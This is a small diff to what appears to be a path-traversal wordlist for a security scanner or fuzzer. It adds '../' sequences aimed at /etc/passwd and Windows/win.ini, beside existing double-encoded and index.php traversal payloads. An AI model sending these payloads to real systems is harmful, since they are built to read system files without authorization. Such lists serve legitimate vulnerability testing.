@@ -246,6 +246,12 @@ static../settings.py
 assets../static/app.js
 assets../settings.py
 assets../settings/90-local.conf
+../../../../../../Windows/win.ini
+../../../../../../etc/passwd
+../../../../../../../../Windows/win.ini
+../../../../../../../../etc/passwd
+../../../../../../../../../../Windows/win.ini
+../../../../../../../../../../etc/passwd
 static/%255c%255c%255c%255c%255c%255c..%255c..%255c..%255c..%255c..%255c..%255c/Windows/win.ini
 static/%255c%255c%255c%255c%255c%255c..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd
 /index.php../../Windows/win.ini
